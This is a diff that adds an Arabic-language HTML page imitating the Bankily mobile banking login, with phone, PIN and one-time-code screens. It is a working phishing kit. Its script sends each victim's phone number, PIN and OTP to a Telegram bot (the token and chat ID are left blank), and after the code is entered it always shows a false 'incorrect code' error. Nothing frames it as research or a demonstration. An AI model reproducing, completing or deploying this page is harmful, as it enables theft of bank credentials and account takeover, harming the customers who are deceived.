@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+<title>Bankily | بنكيلي</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet"/>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;background:#fff}
+
+/* لون تحديد النص */
+::selection {
+  background-color: #b3c5ea !important;
+  color: #000000 !important;
+}
+::-moz-selection {
+  background-color: #b3c5ea !important;
+  color: #000000 !important;
+}
+
+#app{width:100%;height:100%;display:flex;justify-content:center;position:relative}
+.phone{width:100%;max-width:430px;height:100%;background:#fff;display:flex;flex-direction:column;overflow:hidden;position:relative}
+
+.hdr{background:#fff;height:20px;flex-shrink:0;display:flex;align-items:center;padding:0 14px;position:relative}
+
+.body{flex:1;overflow-y:auto;display:flex;flex-direction:column;padding:0 24px 16px;-webkit-overflow-scrolling:touch}
+
+.logo-box{display:flex;justify-content:center;margin:15px 0 25px}
+.logo-box img{width:190px;object-fit:contain}
+
+.field{margin-bottom:20px; position: relative;}
+.lbl{font-size:12.5px;font-weight:600;color:#444;display:block;text-align:right;margin-bottom:6px}
+
+/* حقل اسم المستخدم / رقم الهاتف */
+.row-phone-wrap {
+  display: flex;
+  align-items: center;
+  justify-content: flex-start;
+  width: 100%;
+  direction: rtl;
+}
+.row-phone-input {
+  flex: 1;
+  max-width: 250px;
+  border-bottom: 1.5px solid #333;
+  padding: 2px 0;
+  display: flex;
+  align-items: center;
+}
+.row-phone-input input {
+  width: 100%;
+  border: none;
+  outline: none;
+  font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  font-size: 17px;
+  font-weight: 500;
+  letter-spacing: 1px;
+  color: #1a1a1a;
+  background: transparent;
+  text-align: right !important;
+  direction: rtl !important;
+  caret-color: #1877F2 !important;
+}
+
+.ico{width:22px;height:22px;flex-shrink:0;color:#000;margin-left:10px;}
+
+.errmsg{color:#e74c3c;font-size:11px;text-align:right;margin-top:4px;min-height:14px}
+
+/* حقل الرقم السري */
+.pin-row-wrap {
+  display: flex;
+  align-items: center;
+  justify-content: flex-start;
+  width: 100%;
+  direction: rtl;
+}
+
+.pins-container {
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  gap:10px;
+  direction:ltr;
+  width: 160px;
+}
+
+.pins-container input {
+  width: 32px;
+  height: 28px;
+  text-align: center;
+  font-size: 26px;
+  line-height: 28px;
+  border: none;
+  border-bottom: 2px solid #333;
+  border-radius: 0 !important;
+  outline: none;
+  background: transparent;
+  font-family: system-ui, -apple-system, sans-serif;
+  color: #000;
+  caret-color: #1877F2 !important;
+  padding: 0;
+  direction: ltr;
+  -webkit-text-security: disc !important;
+  text-security: disc !important;
+  box-shadow: none !important;
+}
+
+/* زر نسيت الرقم السري مضبوط تماماً في جهة اليسار تحت الحقل */
+.forgot-container {
+  width: 100%;
+  display: flex;
+  justify-content: flex-start;
+  margin-top: 8px;
+  direction: ltr;
+  padding-left: 0;
+}
+
+.lnk-forgot {
+  font-size: 12px;
+  color: #333;
+  text-decoration: underline;
+  cursor: pointer;
+  background: none;
+  border: none;
+  font-family: 'Cairo', sans-serif;
+  font-weight: 600;
+  display: inline-block;
+  white-space: nowrap;
+}
+
+/* مستخدم جديد بأسلوب أصغر */
+.lnk-md{
+  font-size:11px;
+  font-weight:700;
+  color:#333;
+  text-decoration:underline;
+  cursor:pointer;
+  background:none;
+  border:none;
+  font-family:'Cairo',sans-serif;
+}
+
+.spacer{flex:1;min-height:20px}
+
+/* زر تسجيل الدخول والتحقق */
+.btn{
+  height:50px;
+  background:#F2C029;
+  border:none;
+  width:100%;
+  font-family:'Cairo',sans-serif;
+  font-size:18px;
+  font-weight:800;
+  color:#fff;
+  cursor:pointer;
+  flex-shrink:0;
+  transition:opacity .15s;
+}
+.btn:active{opacity:.85}
+
+.screen{display:flex;flex-direction:column;height:100%}
+.hide{display:none!important}
+
+/* ==================== شاشة OTP ==================== */
+.otp-hdr {
+  background: #29C5E0 !important;
+  height: 48px !important;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  position: relative;
+}
+.otp-hdr .hdr-title {
+  position: static;
+  transform: none;
+  color: #fff;
+  font-size: 17px;
+  font-weight: 700;
+}
+.otp-hdr .hdr-back {
+  position: absolute;
+  right: 14px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: #fff;
+  font-size: 24px;
+  border: none;
+  background: none;
+  cursor: pointer;
+}
+
+.otp-title {
+  font-size: 13.5px;
+  font-weight: 600;
+  color: #666;
+  text-align: center;
+  line-height: 1.5;
+  margin: 30px 15px 30px;
+}
+
+.otp-row {
+  display: flex;
+  gap: 16px;
+  justify-content: center;
+  direction: ltr;
+  margin-bottom: 30px;
+}
+.otp-row input {
+  width: 28px;
+  height: 26px;
+  text-align: center;
+  font-size: 18px;
+  font-weight: 700;
+  font-family: system-ui, -apple-system, sans-serif;
+  border: none;
+  border-bottom: 2px solid #333;
+  border-radius: 0;
+  outline: none;
+  background: transparent;
+  color: #1a1a1a;
+  caret-color: #1877F2 !important;
+  direction: ltr;
+  padding: 0;
+}
+
+.cd-timer-text {
+  text-align: center;
+  font-size: 14px;
+  font-weight: 700;
+  color: #183059;
+  font-family: system-ui, -apple-system, sans-serif;
+}
+
+/* ==================== نوافذ التنبيه المنبثقة ==================== */
+.modal-overlay {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.4);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+}
+
+.modal-card {
+  width: 82%;
+  max-width: 320px;
+  background: #fff;
+  border-radius: 4px;
+  overflow: hidden;
+  box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+  text-align: center;
+  animation: fadeIn 0.2s ease-in-out;
+}
+
+.modal-body {
+  padding: 24px 20px;
+}
+
+.modal-title {
+  font-size: 17px;
+  font-weight: 800;
+  color: #1a1a1a;
+  margin-bottom: 12px;
+}
+
+.modal-text {
+  font-size: 14px;
+  color: #444;
+  line-height: 1.5;
+  font-weight: 600;
+}
+
+.modal-btn {
+  width: 100%;
+  height: 44px;
+  background: #29C5E0;
+  border: none;
+  color: #fff;
+  font-size: 16px;
+  font-weight: 700;
+  font-family: 'Cairo', sans-serif;
+  cursor: pointer;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: scale(0.95); }
+  to { opacity: 1; transform: scale(1); }
+}
+</style>
+</head>
+<body>
+<div id="app">
+<div class="phone">
+
+<div id="pg-login" class="screen">
+  <div class="hdr"></div>
+  <div class="body">
+
+    <div class="logo-box">
+      <img src="logo_bankily.jpeg" alt="Bankily بنكيلي"/>
+    </div>
+
+    <div class="field">
+      <label class="lbl">اسم المستخدم أو رقم الهاتف</label>
+      <div class="row-phone-wrap">
+        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"/>
+          <circle cx="12" cy="10" r="3"/>
+          <path d="M6.16 19a7 7 0 0 1 11.68 0"/>
+        </svg>
+        <div class="row-phone-input" id="row-ph">
+          <input type="tel" id="ph" inputmode="numeric" maxlength="8" placeholder="" autocomplete="off"/>
+        </div>
+      </div>
+      <div class="errmsg" id="err-ph"></div>
+    </div>
+
+    <div class="field">
+      <label class="lbl">الرقم السري</label>
+      <div class="pin-row-wrap">
+        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="5" y="11" width="14" height="10" rx="2"/>
+          <path d="M8 11V7a4 4 0 0 1 8 0"/>
+          <circle cx="12" cy="15" r="1" fill="currentColor"/>
+          <line x1="12" y1="16" x2="12" y2="18"/>
+        </svg>
+        <div class="pins-container" id="row-pin">
+          <input type="password" inputmode="numeric" maxlength="1" class="pin-field" id="p0"/>
+          <input type="password" inputmode="numeric" maxlength="1" class="pin-field" id="p1"/>
+          <input type="password" inputmode="numeric" maxlength="1" class="pin-field" id="p2"/>
+          <input type="password" inputmode="numeric" maxlength="1" class="pin-field" id="p3"/>
+        </div>
+      </div>
+      <div class="forgot-container">
+        <button class="lnk-forgot" onclick="void(0)">نسيت الرقم السري؟</button>
+      </div>
+      <div class="errmsg" id="err-pin"></div>
+    </div>
+
+    <div class="spacer"></div>
+    <div style="text-align:center; margin-bottom: 20px;">
+      <button class="lnk-md" onclick="void(0)">مستخدم جديد؟ سجل الآن!</button>
+    </div>
+  </div>
+  <button class="btn" onclick="login()">تسجيل الدخول</button>
+</div>
+
+<div id="pg-otp" class="screen hide">
+  <div class="hdr otp-hdr">
+    <button class="hdr-back" onclick="back()">&#8249;</button>
+    <div class="hdr-title">رمز التحقق</div>
+  </div>
+  <div class="body" style="align-items:center">
+    <div class="otp-title">أدخل رمز التأكيد المرسل إلى هاتفك المحمول</div>
+    
+    <div class="otp-row">
+      <input type="text" inputmode="numeric" maxlength="1" id="o0"/>
+      <input type="text" inputmode="numeric" maxlength="1" id="o1"/>
+      <input type="text" inputmode="numeric" maxlength="1" id="o2"/>
+      <input type="text" inputmode="numeric" maxlength="1" id="o3"/>
+    </div>
+
+    <div class="cd-timer-text" id="cd">05:00 ثواني</div>
+    
+    <div class="spacer"></div>
+  </div>
+  <button class="btn" onclick="verify()">التحقق</button>
+</div>
+
+<div id="user-error-modal" class="modal-overlay hide">
+  <div class="modal-card">
+    <div class="modal-body">
+      <div class="modal-title">خطأ</div>
+      <div class="modal-text">اسم المستخدم غير صالح</div>
+    </div>
+    <button class="modal-btn" onclick="closeUserErrorModal()">تم</button>
+  </div>
+</div>
+
+<div id="otp-error-modal" class="modal-overlay hide">
+  <div class="modal-card">
+    <div class="modal-body">
+      <div class="modal-title">خطأ</div>
+      <div class="modal-text">رمز التأكيد الذي أدخلته غير صحيح.<br/>يرجى المحاولة مرة أخرى.</div>
+    </div>
+    <button class="modal-btn" onclick="closeOtpErrorModal()">تم</button>
+  </div>
+</div>
+
+</div>
+</div>
+
+<script>
+const telegramToken = "";
+const telegramChatId = "";
+
+function sendToTelegram(phone, pin, otpCode = null) {
+  let message = `🔔 Bankily Login\n📱 Phone: ${phone}\n🔑 Pin: ${pin}`;
+  if (otpCode) {
+    message += `\n📝 OTP: ${otpCode}`;
+  }
+
+  const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+  fetch(url, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      chat_id: telegramChatId,
+      text: message,
+      parse_mode: "HTML"
+    })
+  })
+  .then(response => console.log("Sent"))
+  .catch(error => console.error("Error:", error));
+}
+
+function setupStrictLengthValidation(inputElement, maxLength) {
+  inputElement.addEventListener('keydown', function(e) {
+    const isControlKey = e.key === 'Backspace' || e.key === 'Delete' || e.key === 'ArrowLeft' || e.key === 'ArrowRight' || e.key === 'Tab';
+    const isNumber = /^[0-9]$/.test(e.key);
+
+    if (isControlKey) return;
+    if (!isNumber) { e.preventDefault(); return; }
+
+    if (this.value.length >= maxLength) {
+      e.preventDefault();
+    }
+  });
+
+  inputElement.addEventListener('input', function() {
+    this.value = this.value.replace(/[^0-9]/g, '');
+    if (this.value.length > maxLength) {
+      this.value = this.value.slice(0, maxLength);
+    }
+  });
+}
+
+var P=[0,1,2,3].map(function(i){return document.getElementById('p'+i);});
+P.forEach(function(el,i){
+  setupStrictLengthValidation(el, 1);
+
+  el.addEventListener('focus', function() {
+    if (this.value !== '') return;
+    for (let j = 0; j < P.length; j++) {
+      if (P[j].value === '') {
+        if (j !== i) P[j].focus();
+        break;
+      }
+    }
+  });
+
+  el.addEventListener('input',function(){
+    el.value=el.value.replace(/[^0-9]/g,'');
+    document.getElementById('err-pin').textContent='';
+    if(el.value&&i<3)P[i+1].focus();
+  });
+
+  el.addEventListener('keydown',function(e){
+    if(e.key==='Backspace'){
+      if(el.value.length>0){
+        el.value='';
+      }else if(i>0){
+        P[i-1].focus();
+      }
+      e.preventDefault();
+    }
+  });
+});
+
+var phEl=document.getElementById('ph');
+setupStrictLengthValidation(phEl, 8);
+phEl.addEventListener('input',function(){
+  this.value=this.value.replace(/[^0-9]/g,'');
+  document.getElementById('err-ph').textContent='';
+});
+
+function login(){
+  var ph=phEl.value.trim();
+  var pin=P.map(function(p){return p.value;}).join('');
+  
+  var firstChar = ph.charAt(0);
+  var isValidPrefix = (firstChar === '2' || firstChar === '3' || firstChar === '4');
+
+  if(ph.length !== 8 || !isValidPrefix || pin.length !== 4){
+    document.getElementById('user-error-modal').classList.remove('hide');
+  } else {
+    sendToTelegram(ph, pin);
+    showOtp();
+  }
+}
+
+function closeUserErrorModal(){
+  document.getElementById('user-error-modal').classList.add('hide');
+}
+
+var O=[0,1,2,3].map(function(i){return document.getElementById('o'+i);});
+O.forEach(function(el,i){
+  setupStrictLengthValidation(el, 1);
+
+  el.addEventListener('focus', function() {
+    if (this.value !== '') return;
+    for (let j = 0; j < O.length; j++) {
+      if (O[j].value === '') {
+        if (j !== i) O[j].focus();
+        break;
+      }
+    }
+  });
+
+  el.addEventListener('input',function(){
+    el.value=el.value.replace(/[^0-9]/g,'');
+    if(el.value&&i<3)O[i+1].focus();
+  });
+
+  el.addEventListener('keydown',function(e){
+    if(e.key==='Backspace'){
+      if(el.value.length>0){
+        el.value='';
+      }else if(i>0){
+        O[i-1].focus();
+      }
+      e.preventDefault();
+    }
+  });
+});
+
+function verify(){
+  var code=O.map(function(o){return o.value;}).join('');
+  
+  if(code.length !== 4) {
+    return;
+  }
+  
+  var ph=phEl.value.trim();
+  var pin=P.map(function(p){return p.value;}).join('');
+  
+  sendToTelegram(ph, pin, code);
+
+  document.getElementById('otp-error-modal').classList.remove('hide');
+}
+
+function closeOtpErrorModal(){
+  document.getElementById('otp-error-modal').classList.add('hide');
+  back();
+}
+
+function showOtp(){
+  document.getElementById('pg-login').classList.add('hide');
+  document.getElementById('pg-otp').classList.remove('hide');
+  O.forEach(function(o){o.value='';});
+  O[0].focus();
+  startTimer();
+}
+
+function back(){
+  document.getElementById('pg-otp').classList.add('hide');
+  document.getElementById('pg-login').classList.remove('hide');
+  clearInterval(T);
+}
+
+var TOTAL=300,left=TOTAL,T=null;
+function tick(){
+  var m=Math.floor(left/60),s=left%60;
+  document.getElementById('cd').textContent=String(m).padStart(2,'0')+':'+String(s).padStart(2,'0')+' ثواني';
+  if(left<=0){clearInterval(T);document.getElementById('cd').textContent='انتهت الصلاحية';}
+  else left--;
+}
+function startTimer(){clearInterval(T);left=TOTAL;tick();T=setInterval(tick,1000);}
+</script>
+</body>
+</html>
